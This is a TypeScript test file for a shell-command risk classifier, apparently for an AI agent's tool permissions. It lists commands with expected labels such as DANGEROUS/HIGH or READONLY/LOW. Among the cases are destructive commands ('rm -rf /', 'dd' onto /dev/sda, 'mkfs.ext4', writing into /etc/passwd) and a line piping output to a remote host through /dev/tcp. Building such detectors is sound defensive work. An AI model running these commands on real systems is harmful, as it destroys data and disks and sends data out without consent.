import { describe, expect, it } from "vitest";
import { gradeExpression } from "../src/grade/grade.ts";

/**
 * Differential expectations verified against upstream bash-classify
 * (fprochazka/bash-classify, Python) over a 271-command corpus — 100% match.
 */
const CASES: [string, string, string][] = [
	["ls -la", "READONLY", "LOW"],
	["grep -n \"foo\" file.ts | head -5", "READONLY", "LOW"],
	["PI_DIST=/x/dist; /usr/bin/grep -n \"x\" /y/f.js | head", "READONLY", "LOW"],
	["rm -rf /", "DANGEROUS", "HIGH"],
	["git status", "READONLY", "LOW"],
	["git push origin main", "EXTERNAL_EFFECTS", "MEDIUM"],
	["git push --force origin main", "DANGEROUS", "HIGH"],
	["git reset --hard HEAD~1", "DANGEROUS", "HIGH"],
	["git clean -fdx", "DANGEROUS", "HIGH"],
	["sudo cat /etc/hosts", "DANGEROUS", "HIGH"],
	["cat foo > /etc/passwd", "DANGEROUS", "HIGH"],
	["time nice rtk ls -la", "READONLY", "LOW"],
	["npm install", "LOCAL_EFFECTS", "LOW"],
	["find . -name \"*.ts\" -exec grep foo {} \\;", "READONLY", "LOW"],
	["bash -c \"rm -rf /tmp/x\"", "DANGEROUS", "HIGH"],
	["bash -c \"echo hi\"", "READONLY", "LOW"],
	["exec ls", "DANGEROUS", "HIGH"],
	["export PATH=/usr/bin", "READONLY", "LOW"],
	["export FOO=$(rm -rf /)", "DANGEROUS", "HIGH"],
	["eval \"ls\"", "DANGEROUS", "HIGH"],
	["xargs rm", "DANGEROUS", "HIGH"],
	["timeout 10 npm install", "LOCAL_EFFECTS", "LOW"],
	["env FOO=1 BAR=2 python3 app.py", "DANGEROUS", "HIGH"],
	["docker exec web ls", "DANGEROUS", "HIGH"],
	["git -C /tmp/repo log", "READONLY", "LOW"],
	["git --git-dir=/x/.git status", "READONLY", "LOW"],
	["nohup python3 server.py &", "DANGEROUS", "HIGH"],
	["echo $(date +%s)", "READONLY", "LOW"],
	["ls > /dev/tcp/example.com/80", "DANGEROUS", "HIGH"],
	["rm \"-rf\" /tmp/x", "DANGEROUS", "HIGH"],
	["sudo -u root rm -rf /", "DANGEROUS", "HIGH"],
	["kubectl exec pod-1 -- ls", "EXTERNAL_EFFECTS", "MEDIUM"],
	["cat a b c > out.txt 2>&1", "LOCAL_EFFECTS", "MEDIUM"],
	["if [ -d dir ]; then rm -rf dir; fi", "DANGEROUS", "HIGH"],
	["while read line; do echo $line; done < f", "READONLY", "LOW"],
	["curl -X POST https://api.example.com -d '{}'", "EXTERNAL_EFFECTS", "MEDIUM"],
	["dd if=/dev/zero of=/dev/sda", "UNKNOWN", "HIGH"],
	["mkfs.ext4 /dev/sda1", "DANGEROUS", "HIGH"],
	["shutdown now", "UNKNOWN", "HIGH"],
	["sed -i 's/a/b/g' file", "LOCAL_EFFECTS", "MEDIUM"],
	["./script.sh", "UNKNOWN", "HIGH"],
	["pkill -f node", "DANGEROUS", "HIGH"],
];

describe("gradeExpression (differential vs upstream bash-classify)", () => {
	for (const [expression, classification, risk] of CASES) {
		it(`${expression} → ${classification}/${risk}`, () => {
			const grade = gradeExpression(expression);
			expect(grade.classification).toBe(classification);
			expect(grade.risk).toBe(risk);
		});
	}
});
